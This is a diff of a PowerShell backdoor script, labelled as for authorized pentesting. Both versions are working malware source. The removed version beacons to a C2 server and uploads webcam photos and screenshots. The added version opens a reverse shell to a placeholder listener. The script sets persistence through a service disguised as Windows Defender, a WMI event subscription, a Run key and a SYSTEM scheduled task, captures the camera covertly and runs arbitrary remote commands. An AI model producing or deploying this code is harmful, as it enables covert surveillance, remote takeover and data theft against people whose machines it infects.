@@ -1,275 +1,194 @@
 <#
 .SYNOPSIS
-    Persistent hidden backdoor for authorized penetration testing
-.DESCRIPTION
-    Provides: persistence, hidden process execution, camera capture, hidden CMD
+    Persistent PowerShell backdoor for authorized pentesting
 .NOTES
-    Authorized pentesting use only
+    Replace LISTENER_IP and LISTENER_PORT placeholders
 #>
 
-# === CONFIGURATION ===
-$C2_SERVER = "http://YOUR_C2_IP:PORT"  # Your listener IP
-$BEACON_INTERVAL = 30  # seconds
-$TEMP_DIR = "$env:TEMP"
-$HIDDEN_WINDOW = 0
+param()
 
-# === PERSISTENCE ===
-# Ensure this script runs on every boot from multiple locations
-function Set-Persistence {
-    # Already running from Startup folder via BadKB, but add more locations
-    
-    # Scheduled Task (daily trigger + on startup)
-    $taskName = "WindowsUpdateTask"
-    $scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.ps1"
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`""
-    $trigger = @(
-        (New-ScheduledTaskTrigger -AtStartup),
-        (New-ScheduledTaskTrigger -Daily -At "03:00AM")
-    )
-    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
-    
-    # Registry Run key
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    Set-ItemProperty -Path $regPath -Name "WindowsDefenderUpdate" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`"" -Force
+$ip = LISTENER_IP
+$port = LISTENER_PORT
+$scriptPath = "$env:ProgramData\svchost.ps1"
+
+# === ENSURE PERSISTENCE (Multiple Methods) ===
+
+# 1. Windows Service (already created by BadKB, but ensure it exists)
+$svc = Get-Service "WindowsDefenderService" -ErrorAction SilentlyContinue
+if (-not $svc) {
+    sc.exe create "WindowsDefenderService" binPath="cmd /c powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`"" start=auto DisplayName="Windows Defender Service" obj="LocalSystem" | Out-Null
+    sc.exe start "WindowsDefenderService" | Out-Null
 }
 
-# === HIDDEN PROCESS LAUNCHER ===
-function Start-HiddenProcess {
-    param([string]$Command)
-    $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run($Command, $HIDDEN_WINDOW, $false)
+# 2. WMI Event Subscription (triggers on boot, very stealthy)
+$filterArgs = @{
+    Namespace = 'root\subscription'
+    Name = 'WindowsDefenderFilter'
+    EventNameSpace = 'root\cimv2'
+    QueryLanguage = 'WQL'
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 }
+$filter = Set-WmiInstance -Namespace $filterArgs.Namespace -Class __EventFilter -Arguments @{
+    Name = $filterArgs.Name
+    EventNamespace = $filterArgs.EventNameSpace
+    QueryLanguage = $filterArgs.QueryLanguage
+    Query = $filterArgs.Query
+} -ErrorAction SilentlyContinue
 
-# === HIDDEN CMD EXECUTOR ===
-function Invoke-HiddenCMD {
-    param([string]$Command)
-    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
-    Start-HiddenProcess "cmd.exe /c powershell -NoP -NonI -Exec Bypass -Enc $encoded"
-}
+$consumer = Set-WmiInstance -Namespace $filterArgs.Namespace -Class CommandLineEventConsumer -Arguments @{
+    Name = 'WindowsDefenderConsumer'
+    CommandLineTemplate = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`""
+} -ErrorAction SilentlyContinue
 
-# === CAMERA CAPTURE ===
-function Invoke-CameraCapture {
-    $outputPath = "$TEMP_DIR\capture_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
+# Bind filter and consumer
+$binding = Set-WmiInstance -Namespace $filterArgs.Namespace -Class __FilterToConsumerBinding -Arguments @{
+    Filter = $filter
+    Consumer = $consumer
+} -ErrorAction SilentlyContinue
+
+# 3. Registry Run key (fallback)
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath -Name "WindowsDefenderUpdate" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
+
+# 4. Scheduled Task (on startup, as SYSTEM)
+$taskName = "WindowsDefenderTask"
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
+
+# === MAIN BACKDOOR LOOP ===
+
+function Start-ReverseShell {
+    param($IP, $Port)
     
-    # Method 1: PowerShell + COM (most compatible)
     try {
-        Add-Type -AssemblyName System.Drawing
-        Add-Type -AssemblyName System.Windows.Forms
+        $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
         
-        # Create a hidden form to host the camera
-        $form = New-Object System.Windows.Forms.Form
-        $form.WindowState = 'Minimized'
-        $form.ShowInTaskbar = $false
-        $form.Opacity = 0
+        # Send initial banner
+        $writer.WriteLine("Connected to $env:COMPUTERNAME\$env:USERNAME")
+        $writer.Write("PS $($pwd.Path)> ")
+        $writer.Flush()
         
-        $capture = New-Object System.Windows.Forms.Timer
-        $capture.Interval = 2000
-        $capture.Add_Tick({
-            $form.Close()
-        })
-        $capture.Start()
-        
-        $form.Add_Shown({
-            $form.Activate()
-            # Use MFCapture or fallback
-        })
-        
-        [System.Windows.Forms.Application]::DoEvents()
-        $form.Show()
-        [System.Windows.Forms.Application]::DoEvents()
-        Start-Sleep -Seconds 2
-        $form.Close()
-    } catch {
-        # Fallback: Use Windows built-in camera via PowerShell
-    }
-    
-    # Method 2: Use Windows built-in camera via PowerShell
-    try {
-        $psScript = @"
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Drawing;
-using System.Drawing.Imaging;
-public class Camera {
-    [DllImport("avicap32.dll")]
-    private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hwndParent, int nID);
-    
-    [DllImport("user32.dll")]
-    private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
-    
-    private const int WM_CAP_CONNECT = 0x040A;
-    private const int WM_CAP_DISCONNECT = 0x040B;
-    private const int WM_CAP_GRAB_FRAME = 0x040C;
-    private const int WM_CAP_COPY = 0x041D;
-    private const int WM_CAP_EDIT_COPY = 0x041E;
-    
-    public static void Capture(string filePath) {
-        IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0x40000000, 0, 0, 320, 240, IntPtr.Zero, 0);
-        if (hWnd != IntPtr.Zero) {
-            SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
-            SendMessage(hWnd, WM_CAP_GRAB_FRAME, 0, 0);
-            SendMessage(hWnd, WM_CAP_EDIT_COPY, 0, 0);
-            if (Clipboard.ContainsImage()) {
-                var img = Clipboard.GetImage();
-                img.Save(filePath, ImageFormat.Jpeg);
-            }
-            SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
-        }
-    }
-}
-"@
-        [Camera]::Capture("$outputPath")
-    } catch {
-        # Method 3: Simple screenshot fallback if no camera
-        $null
-    }
-    
-    if (Test-Path $outputPath) {
-        # Exfiltrate via C2
-        try {
-            $bytes = [IO.File]::ReadAllBytes($outputPath)
-            $web = New-Object Net.WebClient
-            $web.UploadData("$C2_SERVER/capture", "POST", $bytes)
-        } catch {}
-        return "Camera capture saved to $outputPath"
-    }
-    return "Camera capture failed or no camera available"
-}
-
-# === BACKDOOR SHELL ===
-function Start-BackdoorShell {
-    # HTTP Beacon-based C2 (simple polling)
-    $web = New-Object Net.WebClient
-    
-    while ($true) {
-        try {
-            # Send beacon with system info
-            $hostname = "$env:COMPUTERNAME"
-            $username = "$env:USERNAME"
-            $os = (Get-WmiObject Win32_OperatingSystem).Caption
-            $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*VMware*" -and $_.InterfaceAlias -notlike "*Virtual*"} | Select-Object -First 1).IPAddress
+        while ($client.Connected) {
+            $line = $reader.ReadLine()
+            if (-not $line) { break }
             
-            $beacon = @"
-hostname=$hostname&user=$username&os=$os&ip=$ip&status=alive
-"@
+            $output = ""
             
-            # Send beacon and get command
-            try {
-                $response = $web.DownloadString("$C2_SERVER/beacon?id=$hostname")
-            } catch {
-                Start-Sleep -Seconds $BEACON_INTERVAL
-                continue
-            }
-            
-            if ($response -and $response -ne "") {
-                $command = $response.Trim()
-                
-                # Parse command
-                if ($command -eq "camera" -or $command -eq "cam" -or $command -eq "photo") {
-                    $result = Invoke-CameraCapture
-                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", $result) } catch {}
-                } 
-                elseif ($command -eq "screenshot" -or $command -eq "ss") {
-                    Add-Type -AssemblyName System.Drawing
-                    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-                    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
-                    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
-                    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
-                    $ssPath = "$TEMP_DIR\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-                    $bmp.Save($ssPath, [System.Drawing.Imaging.ImageFormat]::Png)
-                    $graphics.Dispose()
-                    $bmp.Dispose()
-                    try { 
-                        $bytes = [IO.File]::ReadAllBytes($ssPath)
-                        $web.UploadData("$C2_SERVER/screenshot?id=$hostname", "POST", $bytes)
-                    } catch {}
-                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", "Screenshot saved to $ssPath") } catch {}
-                }
-                elseif ($command -eq "exit" -or $command -eq "quit") {
+            switch -Regex ($line.Trim()) {
+                "^exit$" {
+                    $writer.WriteLine("Goodbye")
+                    $writer.Flush()
+                    $client.Close()
                     return
                 }
-                elseif ($command -eq "persist" -or $command -eq "ensure") {
-                    Set-Persistence
-                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", "Persistence ensured") } catch {}
+                "^persist$" {
+                    $output = "Persistence already configured"
                 }
-                elseif ($command -like "hidden *") {
-                    # Run command hidden
-                    $cmdToRun = $command.Substring(7)
-                    Start-HiddenProcess $cmdToRun
-                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", "Hidden process started: $cmdToRun") } catch {}
+                "^run (.+)$" {
+                    $cmd = $matches[1]
+                    try {
+                        $psi = New-Object System.Diagnostics.ProcessStartInfo
+                        $psi.FileName = "powershell.exe"
+                        $psi.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Command `"$cmd`""
+                        $psi.WindowStyle = 'Hidden'
+                        $psi.CreateNoWindow = $true
+                        $psi.UseShellExecute = $false
+                        [System.Diagnostics.Process]::Start($psi) | Out-Null
+                        $output = "OK: $cmd launched hidden"
+                    } catch {
+                        $output = "Error: $_"
+                    }
                 }
-                elseif ($command -like "cmd *") {
-                    # Run command in hidden CMD and return output
-                    $cmdToRun = $command.Substring(4)
-                    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("$cmdToRun"))
-                    $tempOut = "$TEMP_DIR\out_$(Get-Random).txt"
-                    Start-HiddenProcess "cmd.exe /c $cmdToRun > `"$tempOut`" 2>&1"
-                    Start-Sleep -Seconds 2
-                    if (Test-Path $tempOut) {
-                        $output = Get-Content $tempOut -Raw
-                        Remove-Item $tempOut -Force
-                    } else { $output = "No output or command still running" }
-                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", $output) } catch {}
+                "^hidden (.+)$" {
+                    $cmd = $matches[1]
+                    try {
+                        $psi = New-Object System.Diagnostics.ProcessStartInfo
+                        $psi.FileName = $cmd.Split(' ')[0]
+                        $psi.Arguments = $cmd.Substring($cmd.IndexOf(' ') + 1)
+                        $psi.WindowStyle = 'Hidden'
+                        $psi.CreateNoWindow = $true
+                        $psi.UseShellExecute = $false
+                        [System.Diagnostics.Process]::Start($psi) | Out-Null
+                        $output = "OK: $cmd launched hidden"
+                    } catch {
+                        $output = "Error: $_"
+                    }
                 }
-                elseif ($command -like "ps *") {
-                    # PowerShell command execution
-                    $psCmd = $command.Substring(3)
-                    $output = try { Invoke-Expression $psCmd 2>&1 | Out-String } catch { $_ | Out-String }
-                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", $output) } catch {}
+                "^camera$|^cam$|^photo$" {
+                    try {
+                        # Launch hidden camera capture
+                        $captureScript = @"
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+`$form = New-Object System.Windows.Forms.Form
+`$form.WindowState = 'Minimized'
+`$form.ShowInTaskbar = `$false
+`$form.Opacity = 0
+
+`$timer = New-Object System.Windows.Forms.Timer
+`$timer.Interval = 2000
+`$timer.Add_Tick({ `$form.Close() })
+`$timer.Start()
+
+`$form.Add_Shown({ `$form.Activate() })
+`$form.Show()
+`$form.Activate()
+
+Start-Sleep -Milliseconds 500
+
+# Use SendKeys to trigger camera
+[System.Windows.Forms.SendKeys]::SendWait('{LWIN}')
+Start-Sleep -Milliseconds 500
+[System.Windows.Forms.SendKeys]::SendWait('camera')
+Start-Sleep -Milliseconds 1000
+[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')
+Start-Sleep -Milliseconds 3000
+[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
+Start-Sleep -Milliseconds 500
+
+# Save clipboard as image
+if ([System.Windows.Forms.Clipboard]::ContainsImage()) {
+    `$img = [System.Windows.Forms.Clipboard]::GetImage()
+    `$path = "`$env:TEMP\cam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
+    `$img.Save(`$path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+    `$output = `$path
+}
+"@
+                        $captureResult = powershell -NoP -NonI -Exec Bypass -Command $captureScript
+                        $output = "Camera capture: $captureResult"
+                    } catch {
+                        $output = "Camera error: $_"
+                    }
                 }
-                else {
-                    # Default: treat as CMD command
-                    $tempOut = "$TEMP_DIR\out_$(Get-Random).txt"
-                    Start-HiddenProcess "cmd.exe /c $command > `"$tempOut`" 2>&1"
-                    Start-Sleep -Seconds 2
-                    if (Test-Path $tempOut) {
-                        $output = Get-Content $tempOut -Raw
-                        Remove-Item $tempOut -Force
-                    } else { $output = "No output" }
-                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", $output) } catch {}
+                default {
+                    # Execute any PowerShell command
+                    try {
+                        $output = Invoke-Expression $line 2>&1 | Out-String
+                    } catch {
+                        $output = "Error: $_"
+                    }
                 }
             }
             
-            Start-Sleep -Seconds $BEACON_INTERVAL
-        } catch {
-            Start-Sleep -Seconds $BEACON_INTERVAL
+            $writer.Write($output.Trim() + "`nPS $($pwd.Path)> ")
+            $writer.Flush()
         }
+    } catch {
+        # Silently fail and retry
+    }
+    finally {
+        if ($client) { $client.Close() }
     }
 }
 
-# === LOCAL KEY LISTENER (for keyboard shortcuts) ===
-function Start-LocalListener {
-    # Monitor for special trigger files in TEMP
-    $watch = New-Object IO.FileSystemWatcher
-    $watch.Path = $TEMP_DIR
-    $watch.Filter = "*.trigger"
-    $watch.EnableRaisingEvents = $true
-    
-    Register-ObjectEvent $watch "Created" -Action {
-        $triggerFile = $Event.SourceEventArgs.FullPath
-        $triggerName = [IO.Path]::GetFileNameWithoutExtension($triggerFile)
-        
-        switch ($triggerName.ToLower()) {
-            "camera" { $result = Invoke-CameraCapture }
-            "cmd" { Invoke-HiddenCMD "cmd.exe" }
-            default { 
-                # Treat trigger filename as command
-                Invoke-HiddenCMD $triggerName
-            }
-        }
-        
-        Remove-Item $triggerFile -Force
-    } | Out-Null
+# === RECONNECTION LOOP ===
+while ($true) {
+    Start-ReverseShell -IP $ip -Port $port
+    Start-Sleep -Seconds 10  # Wait before reconnecting
 }
-
-# === MAIN EXECUTION ===
-# Set persistence first
-Set-Persistence
-
-# Start local listener in background
-Start-LocalListener
-
-# Start C2 backdoor shell
-Start-BackdoorShell
